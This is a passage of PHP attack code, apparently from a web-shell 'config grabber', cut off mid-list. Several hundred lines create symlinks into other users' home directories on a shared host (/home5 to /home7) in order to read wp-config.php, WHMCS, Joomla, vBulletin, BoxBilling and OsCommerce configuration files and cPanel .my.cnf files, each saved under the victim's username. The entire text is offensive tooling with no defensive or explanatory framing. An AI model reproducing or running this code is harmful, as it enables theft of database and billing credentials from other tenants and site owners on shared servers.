@symlink('/home5/'.$user.'/public_html/billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/MY/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/My/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/my/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/secure/whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/secure/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/panel/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/clientes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/cliente/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/support/order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home5/'.$user.'/public_html/boxbilling/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home5/'.$user.'/public_html/box/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home5/'.$user.'/public_html/host/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home5/'.$user.'/public_html/Host/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home5/'.$user.'/public_html/supportes/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home5/'.$user.'/public_html/support/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home5/'.$user.'/public_html/hosting/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home5/'.$user.'/public_html/cart/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home5/'.$user.'/public_html/order/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home5/'.$user.'/public_html/client/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home5/'.$user.'/public_html/clients/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home5/'.$user.'/public_html/cliente/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home5/'.$user.'/public_html/clientes/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home5/'.$user.'/public_html/billing/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home5/'.$user.'/public_html/billings/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home5/'.$user.'/public_html/my/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home5/'.$user.'/public_html/secure/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home5/'.$user.'/public_html/support/order/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home5/'.$user.'/public_html/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home5/'.$user.'/public_html/zencart/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home5/'.$user.'/public_html/products/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home5/'.$user.'/public_html/cart/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home5/'.$user.'/public_html/shop/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home5/'.$user.'/public_html/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home5/'.$user.'/public_html/hostbills/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home5/'.$user.'/public_html/host/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home5/'.$user.'/public_html/Host/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home5/'.$user.'/public_html/supportes/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home5/'.$user.'/public_html/support/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home5/'.$user.'/public_html/hosting/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home5/'.$user.'/public_html/cart/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home5/'.$user.'/public_html/order/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home5/'.$user.'/public_html/client/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home5/'.$user.'/public_html/clients/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home5/'.$user.'/public_html/cliente/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home5/'.$user.'/public_html/clientes/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home5/'.$user.'/public_html/billing/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home5/'.$user.'/public_html/billings/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home5/'.$user.'/public_html/my/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home5/'.$user.'/public_html/secure/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home5/'.$user.'/public_html/support/order/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home5/'.$user.'/.my.cnf',$user.'-Cpanel.txt');
@symlink('/home5/'.$user.'/public_html/po-content/config.php',$user.'-Popoji.txt');

//home6

@symlink('/home6/'.$user.'/public_html/vb/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home6/'.$user.'/public_html/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home6/'.$user.'/public_html/forum/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home6/'.$user.'/public_html/forums/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home6/'.$user.'/public_html/cc/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home6/'.$user.'/public_html/inc/config.php',$user.'-MyBB.txt');
@symlink('/home6/'.$user.'/public_html/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home6/'.$user.'/public_html/shop/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home6/'.$user.'/public_html/os/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home6/'.$user.'/public_html/oscom/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home6/'.$user.'/public_html/products/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home6/'.$user.'/public_html/cart/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home6/'.$user.'/public_html/inc/conf_global.php',$user.'-IPB.txt');
@symlink('/home6/'.$user.'/public_html/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home6/'.$user.'/public_html/wp/test/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home6/'.$user.'/public_html/blog/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home6/'.$user.'/public_html/beta/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home6/'.$user.'/public_html/portal/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home6/'.$user.'/public_html/site/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home6/'.$user.'/public_html/wp/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home6/'.$user.'/public_html/WP/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home6/'.$user.'/public_html/news/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home6/'.$user.'/public_html/wordpress/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home6/'.$user.'/public_html/test/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home6/'.$user.'/public_html/demo/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home6/'.$user.'/public_html/home/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home6/'.$user.'/public_html/v1/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home6/'.$user.'/public_html/v2/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home6/'.$user.'/public_html/press/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home6/'.$user.'/public_html/new/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home6/'.$user.'/public_html/blogs/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home6/'.$user.'/public_html/configuration.php',$user.'-Joomla.txt');
@symlink('/home6/'.$user.'/public_html/blog/configuration.php',$user.'-Joomla.txt');
@symlink('/home6/'.$user.'/public_html/submitticket.php',$user.'-^WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/cms/configuration.php',$user.'-Joomla.txt');
@symlink('/home6/'.$user.'/public_html/beta/configuration.php',$user.'-Joomla.txt');
@symlink('/home6/'.$user.'/public_html/portal/configuration.php',$user.'-Joomla.txt');
@symlink('/home6/'.$user.'/public_html/site/configuration.php',$user.'-Joomla.txt');
@symlink('/home6/'.$user.'/public_html/main/configuration.php',$user.'-Joomla.txt');
@symlink('/home6/'.$user.'/public_html/home/configuration.php',$user.'-Joomla.txt');
@symlink('/home6/'.$user.'/public_html/demo/configuration.php',$user.'-Joomla.txt');
@symlink('/home6/'.$user.'/public_html/test/configuration.php',$user.'-Joomla.txt');
@symlink('/home6/'.$user.'/public_html/v1/configuration.php',$user.'-Joomla.txt');
@symlink('/home6/'.$user.'/public_html/v2/configuration.php',$user.'-Joomla.txt');
@symlink('/home6/'.$user.'/public_html/joomla/configuration.php',$user.'-Joomla.txt');
@symlink('/home6/'.$user.'/public_html/new/configuration.php',$user.'-Joomla.txt');
@symlink('/home6/'.$user.'/public_html/WHMCS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/whmcs1/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/Whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/WHMC/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/Whmc/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/whmc/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/WHM/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/Whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/HOST/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/Host/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/host/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/SUPPORTES/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/Supportes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/supportes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/domains/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/domain/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/Hosting/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/HOSTING/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/hosting/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/CART/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/Cart/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/cart/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/ORDER/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/Order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/CLIENT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/Client/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/client/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/CLIENTAREA/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/Clientarea/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/clientarea/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/SUPPORT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/Support/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/support/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/BILLING/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/Billing/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/billing/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/BUY/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/Buy/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/buy/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/MANAGE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/Manage/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/manage/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/CLIENTSUPPORT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/ClientSupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/Clientsupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/clientsupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/CHECKOUT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/Checkout/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/checkout/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/BILLINGS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/Billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/BASKET/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/Basket/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/basket/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/SECURE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/Secure/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/secure/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/SALES/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/Sales/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/sales/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/BILL/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/Bill/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/bill/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/PURCHASE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/Purchase/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/purchase/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/ACCOUNT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/Account/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/account/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/USER/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/User/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/user/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/CLIENTS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/Clients/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/clients/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/BILLINGS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/Billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/MY/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/My/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/my/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/secure/whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/secure/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/panel/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/clientes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/cliente/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/support/order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home6/'.$user.'/public_html/boxbilling/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home6/'.$user.'/public_html/box/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home6/'.$user.'/public_html/host/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home6/'.$user.'/public_html/Host/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home6/'.$user.'/public_html/supportes/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home6/'.$user.'/public_html/support/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home6/'.$user.'/public_html/hosting/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home6/'.$user.'/public_html/cart/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home6/'.$user.'/public_html/order/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home6/'.$user.'/public_html/client/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home6/'.$user.'/public_html/clients/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home6/'.$user.'/public_html/cliente/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home6/'.$user.'/public_html/clientes/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home6/'.$user.'/public_html/billing/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home6/'.$user.'/public_html/billings/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home6/'.$user.'/public_html/my/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home6/'.$user.'/public_html/secure/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home6/'.$user.'/public_html/support/order/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home6/'.$user.'/public_html/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home6/'.$user.'/public_html/zencart/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home6/'.$user.'/public_html/products/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home6/'.$user.'/public_html/cart/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home6/'.$user.'/public_html/shop/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home6/'.$user.'/public_html/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home6/'.$user.'/public_html/hostbills/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home6/'.$user.'/public_html/host/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home6/'.$user.'/public_html/Host/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home6/'.$user.'/public_html/supportes/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home6/'.$user.'/public_html/support/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home6/'.$user.'/public_html/hosting/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home6/'.$user.'/public_html/cart/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home6/'.$user.'/public_html/order/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home6/'.$user.'/public_html/client/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home6/'.$user.'/public_html/clients/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home6/'.$user.'/public_html/cliente/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home6/'.$user.'/public_html/clientes/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home6/'.$user.'/public_html/billing/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home6/'.$user.'/public_html/billings/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home6/'.$user.'/public_html/my/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home6/'.$user.'/public_html/secure/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home6/'.$user.'/public_html/support/order/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home6/'.$user.'/.my.cnf',$user.'-Cpanel.txt');
@symlink('/home6/'.$user.'/public_html/po-content/config.php',$user.'-Popoji.txt');

//home 7 

@symlink('/home7/'.$user.'/public_html/vb/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home7/'.$user.'/public_html/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home7/'.$user.'/public_html/forum/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home7/'.$user.'/public_html/forums/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home7/'.$user.'/public_html/cc/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home7/'.$user.'/public_html/inc/config.php',$user.'-MyBB.txt');
@symlink('/home7/'.$user.'/public_html/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home7/'.$user.'/public_html/shop/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home7/'.$user.'/public_html/os/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home7/'.$user.'/public_html/oscom/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home7/'.$user.'/public_html/products/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home7/'.$user.'/public_html/cart/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home7/'.$user.'/public_html/inc/conf_global.php',$user.'-IPB.txt');
@symlink('/home7/'.$user.'/public_html/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home7/'.$user.'/public_html/wp/test/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home7/'.$user.'/public_html/blog/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home7/'.$user.'/public_html/beta/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home7/'.$user.'/public_html/portal/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home7/'.$user.'/public_html/site/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home7/'.$user.'/public_html/wp/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home7/'.$user.'/public_html/WP/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home7/'.$user.'/public_html/news/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home7/'.$user.'/public_html/wordpress/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home7/'.$user.'/public_html/test/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home7/'.$user.'/public_html/demo/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home7/'.$user.'/public_html/home/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home7/'.$user.'/public_html/v1/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home7/'.$user.'/public_html/v2/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home7/'.$user.'/public_html/press/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home7/'.$user.'/public_html/new/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home7/'.$user.'/public_html/blogs/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home7/'.$user.'/public_html/configuration.php',$user.'-Joomla.txt');
@symlink('/home7/'.$user.'/public_html/blog/configuration.php',$user.'-Joomla.txt');
@symlink('/home7/'.$user.'/public_html/submitticket.php',$user.'-^WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/cms/configuration.php',$user.'-Joomla.txt');
@symlink('/home7/'.$user.'/public_html/beta/configuration.php',$user.'-Joomla.txt');
@symlink('/home7/'.$user.'/public_html/portal/configuration.php',$user.'-Joomla.txt');
@symlink('/home7/'.$user.'/public_html/site/configuration.php',$user.'-Joomla.txt');
@symlink('/home7/'.$user.'/public_html/main/configuration.php',$user.'-Joomla.txt');
@symlink('/home7/'.$user.'/public_html/home/configuration.php',$user.'-Joomla.txt');
@symlink('/home7/'.$user.'/public_html/demo/configuration.php',$user.'-Joomla.txt');
@symlink('/home7/'.$user.'/public_html/test/configuration.php',$user.'-Joomla.txt');
@symlink('/home7/'.$user.'/public_html/v1/configuration.php',$user.'-Joomla.txt');
@symlink('/home7/'.$user.'/public_html/v2/configuration.php',$user.'-Joomla.txt');
@symlink('/home7/'.$user.'/public_html/joomla/configuration.php',$user.'-Joomla.txt');
@symlink('/home7/'.$user.'/public_html/new/configuration.php',$user.'-Joomla.txt');
@symlink('/home7/'.$user.'/public_html/WHMCS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/whmcs1/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/Whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/WHMC/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/Whmc/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/whmc/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/WHM/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/Whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/HOST/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/Host/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/host/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/SUPPORTES/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/Supportes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/supportes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/domains/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/domain/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/Hosting/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/HOSTING/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/hosting/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/CART/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/Cart/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/cart/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/ORDER/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/Order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/CLIENT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/Client/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/client/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/CLIENTAREA/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/Clientarea/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/clientarea/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/SUPPORT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/Support/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/support/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/BILLING/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/Billing/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/billing/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/BUY/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/Buy/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/buy/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/MANAGE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/Manage/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/manage/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/CLIENTSUPPORT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/ClientSupport/configuration.php',$user.'-WHMCS.txt');
